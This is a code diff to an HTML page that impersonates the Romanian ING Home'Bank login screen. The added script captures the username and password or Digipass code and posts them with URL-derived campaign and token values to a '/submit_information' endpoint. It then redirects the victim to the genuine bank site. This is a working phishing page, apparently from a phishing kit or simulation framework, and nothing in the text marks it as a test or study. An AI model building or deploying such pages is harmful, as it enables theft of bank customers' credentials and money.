@@ -4,25 +4,145 @@
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <title>ING Home'Bank Login</title>
-    <link rel="stylesheet" href="ingbank.css"> <!-- Link to external CSS for better management -->
+    <link rel="stylesheet" href="/LandingPages/ingbank/ingbank.css">
+    
 
 </head>
 <body>
     <div class="login-container">
-        <h2>Bine ai venit în ING Home'Bank!</h2>
-        <form class="login-form">
+        <h2>Bine ai venit în <span class="bold-text">ING Home’Bank!</span></h2>
+        <form class="login-form" id="loginForm">
             <div class="form-group">
                 <label for="username">Codul de utilizator</label>
                 <input type="text" id="username" placeholder="Introdu codul" required>
+                <div class="error-message" id="usernameError"></div>
             </div>
-            <div class="form-group">
+            <div class="form-group" id="formPassword">
                 <label for="password">Parola sau cod Digipass</label>
-                <input type="password" id="password" placeholder="Introdu parola sau Digipass" required>
+                <input type="password" class="ing-ro-input__input" id="password" placeholder="Introdu parola sau Digipass" maxlength="6" required>
+                <div class="error-message" id="passwordError"></div>
             </div>
-            <button type="submit">Login</button>
+            <button type="submit"> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="rgb(255,255,255)" viewBox="0 0 24 24" color="#ffffff" aria-hidden="true"><path d="M11.672.35c3.139 0 5.697 2.515 5.809 5.66l.004.216-.001 2.792h.62a2.25 2.25 0 012.234 2.11l.006.154v10.114c0 1.25-1.003 2.264-2.24 2.264H5.24C4.003 23.66 3 22.646 3 21.396V11.282c0-1.25 1.003-2.263 2.24-2.263l.618-.001V6.226C5.859 2.98 8.462.35 11.673.35zm6.432 10.306H5.24c-.342 0-.619.28-.619.626v10.114c0 .346.277.626.62.626h12.864c.342 0 .62-.28.62-.626V11.282a.623.623 0 00-.62-.626zm-6.432 2.697c1.631 0 2.954 1.337 2.954 2.986 0 1.65-1.323 2.986-2.954 2.986-1.632 0-2.954-1.337-2.954-2.986 0-1.649 1.322-2.986 2.954-2.986zm0 1.638c-.737 0-1.334.604-1.334 1.348 0 .745.597 1.349 1.334 1.349.737 0 1.334-.604 1.334-1.349 0-.744-.597-1.348-1.334-1.348zm0-13.004c-2.248 0-4.082 1.788-4.188 4.033l-.005.206-.001 2.792h8.386V6.226c0-2.341-1.877-4.239-4.192-4.239z" fill-rule="nonzero"></path></svg> 
+                Login</button>
             <a href="#">Nu reușești să te autentifici?</a>
             <a href="#">Activează Home'Bank</a>
         </form>
     </form>
+
+    <script>
+
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            validateForm();
+        });
+
+        function validateForm() {
+            let isValid = true;
+            
+            // Username validation
+            const username = document.getElementById('username');
+            const usernameError = document.getElementById('usernameError');
+            if (username.value.trim() === '') {
+                username.classList.add('input-error');
+                usernameError.textContent = 'Te rugăm să introduci codul de utilizator.';
+                isValid = false;
+            } else if (username.value.length < 3) {
+                username.classList.add('input-error');
+                usernameError.textContent = 'Te rugăm să introduci codul de utilizator.';
+                isValid = false;
+            } else {
+                username.classList.remove('input-error');
+                usernameError.textContent = '';
+            }
+
+            // Password validation
+            const password = document.getElementById('password');
+            const passwordError = document.getElementById('passwordError');
+            const passwordPattern = /^[0-9]*$/; // Only numerical characters
+            if (password.value.trim() === '') {
+                password.classList.add('input-error');
+                passwordError.textContent = 'Te rugăm să introduci parola sau codul digipass.';
+                isValid = false;
+            } else if (!passwordPattern.test(password.value)) {
+                password.classList.add('input-error');
+                passwordError.textContent = 'Parola sau codul Digipass poate conține doar caractere numerice/cifre.';
+                isValid = false;
+            } else {
+                password.classList.remove('input-error');
+                passwordError.textContent = '';
+            }
+
+            if (isValid) {
+                event.preventDefault();
+                const username = document.querySelector('#username').value;
+                const password = document.querySelector('#password').value;
+                const page = 'Ingbank';
+                var campaignId = window.location.pathname.split('/')[2];
+                var token = window.location.pathname.split('/')[3];
+                console.log(username, password, token, page, campaignId);
+                fetch('/submit_information', {
+                    method: 'POST',
+                    headers: {
+                            'Content-Type': 'application/json',
+                        },
+                    body: JSON.stringify({ username, password, token, page, campaignId })
+                })
+                .then(response => {
+                    if(response.ok) {
+                        window.location.href = 'https://www.homebank.ro/hb/hb/#/login'; // Redirect after successful submission
+                    }
+                    return response.json();
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                });
+            }
+        }
+
+        document.getElementById('username').addEventListener('blur', function() {
+            validateUsername();
+        });
+
+        document.getElementById('password').addEventListener('blur', function() {
+            validatePassword();
+        });
+
+        function validateUsername() {
+            const username = document.getElementById('username');
+            const usernameError = document.getElementById('usernameError');
+            if (username.value.trim() === '') {
+                username.classList.add('input-error');
+                document.getElementById('username').style.border = '1px solid red';
+                usernameError.textContent = 'Te rugăm să introduci codul de utilizator.';
+            } else if (username.value.length < 3) {
+                username.classList.add('input-error');
+                document.getElementById('username').style.border = '1px solid red';
+                usernameError.textContent = 'Te rugăm să introduci codul de utilizator.';
+            } else {
+                username.classList.remove('input-error');
+                document.getElementById('username').style.border = '1px solid #D9D9D9';
+                usernameError.textContent = '';
+            }
+        }
+
+        function validatePassword() {
+            const password = document.getElementById('password');
+            const passwordError = document.getElementById('passwordError');
+            const passwordPattern = /^[0-9]*$/; // Only numerical characters
+            if (password.value.trim() === '') {
+                password.classList.add('input-error');
+                document.getElementById('password').style.border = '1px solid red';
+                passwordError.textContent = 'Te rugăm să introduci parola sau codul digipass.';
+            } else if (!passwordPattern.test(password.value)) {
+                password.classList.add('input-error');
+                document.getElementById('password').style.border = '1px solid red';
+                passwordError.textContent = 'Parola sau codul Digipass poate conține doar caractere numerice/cifre.';
+            } else {
+                password.classList.remove('input-error');
+                document.getElementById('password').style.border = '1px solid #D9D9D9';
+                passwordError.textContent = '';
+            }
+        }
+    </script>
 </body>
 </html>
